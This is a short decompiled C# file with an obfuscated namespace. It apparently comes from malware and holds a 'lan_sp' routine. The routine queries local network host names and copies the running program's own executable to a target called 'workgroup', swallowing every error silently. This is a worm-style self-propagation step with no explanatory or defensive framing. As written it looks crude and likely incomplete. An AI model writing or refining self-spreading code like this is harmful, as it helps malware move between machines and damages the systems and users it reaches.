using System;
using System.IO;
using System.Net;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace AdasdASDwdadwAWD;

[StandardModule]
internal sealed class lan
{
	public static void lan_sp()
	{
		try
		{
			IPAddress[] hostAddresses = Dns.GetHostAddresses(Dns.GetHostName());
			hostAddresses[0].ToString();
			Dns.GetHostEntry("workgroup");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Application.get_ExecutablePath(), "workgroup");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}
}
